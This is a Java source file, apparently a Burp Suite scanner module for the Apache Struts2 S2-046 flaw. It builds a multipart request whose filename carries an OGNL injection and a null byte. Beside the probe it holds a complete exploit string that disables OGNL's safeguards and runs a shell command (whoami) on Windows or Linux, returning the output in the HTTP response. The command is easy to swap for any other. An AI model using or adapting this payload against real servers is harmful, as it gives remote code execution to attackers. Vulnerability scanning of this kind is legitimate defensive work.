package module;

import burp.*;

import java.util.Collections;
import java.util.List;

public class S2_046 extends IModule {
    public String poc = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xxx','"+injectMark[0]+"'+'"+injectMark[1]+"')}";
    public String exp =
            "%{" +
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
            ".(" +
            "#_memberAccess?(#_memberAccess=#dm):" +
            "(" +
            "(#container=#context['com.opensymphony.xwork2.ActionContext.container'])" +
            ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" +
            ".(#ognlUtil.getExcludedPackageNames().clear())" +
            ".(#ognlUtil.getExcludedClasses().clear())" +
            ".(#context.setMemberAccess(#dm))" +
            ")" +
            ")" +
            ".(#cmd='whoami')" +
            ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" +
            ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" +
            ".(#p=new java.lang.ProcessBuilder(#cmds))" +
            ".(#p.redirectErrorStream(true))" +
            ".(#process=#p.start())" +
            ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" +
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" +
            ".(#ros.flush())" +
            "}";


    public String contentType = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2";
    public String requestBody =
            "------WebKitFormBoundaryXd004BVJN9pBYBL2\r\n" +
            "Content-Disposition: form-data; name=\"upload\"; filename=\"{payload}"+new String(new byte[]{0x00})+".\"\r\n" +
            "Content-Type: text/plain\r\n" +
            "\r\n" +
            "foo\r\n" +
            "------WebKitFormBoundaryXd004BVJN9pBYBL2--";

    @Override
    public IScanIssue start() {
        List<String> headers = requestInfo.getHeaders();
        Collections.replaceAll(headers, headers.get(0), headers.get(0).replace("GET", "POST"));
        for (String header: headers) {
            if (header.contains("Content-Type")) {
                headers.remove(header);
                break;
            }
        }
        headers.add(contentType);

        request = helpers.buildHttpMessage(headers, requestBody.replace("{payload}", poc).getBytes());
        if (check()) {
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return null;
    }
}
